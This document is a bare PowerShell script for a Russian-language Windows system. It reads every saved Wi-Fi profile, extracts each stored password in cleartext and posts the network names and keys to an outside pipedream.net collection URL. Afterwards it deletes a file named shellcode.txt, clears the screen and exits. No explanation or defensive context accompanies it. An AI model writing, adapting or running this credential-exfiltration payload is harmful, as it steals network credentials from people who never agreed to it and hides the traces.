$wifi_ru=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize
$url="https://en1n5nbzs7d1uro.m.pipedream.net"
$wifi_ru
$wifi_ru | Out-File tmp.txt
$data=Get-Content .\tmp.txt
$data
Invoke-RestMethod -Method Post -Uri $url -Body $data
Remove-Item -Path shellcode.txt
clear
exit